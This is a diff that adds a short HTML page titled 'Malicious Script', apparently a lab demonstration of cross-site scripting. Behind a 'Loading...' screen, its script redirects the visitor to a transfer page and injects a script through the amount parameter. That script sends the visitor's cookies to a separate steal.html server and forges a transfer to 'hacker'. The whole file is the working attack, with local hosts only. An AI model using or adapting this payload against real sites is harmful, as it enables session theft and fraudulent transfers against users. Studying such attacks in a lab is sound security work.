@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Script</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // Construct the malicious URL with XSS payload
+        const victimURL = "http://localhost:8000/transfer.html?recipient=hacker&amount=<script>document.location='http://localhost:9000/steal.html?cookie='+document.cookie</script>";
+
+        // Redirect the victim's browser to the malicious URL
+        document.location = victimURL;
+    </script>
+</body>
+</html>
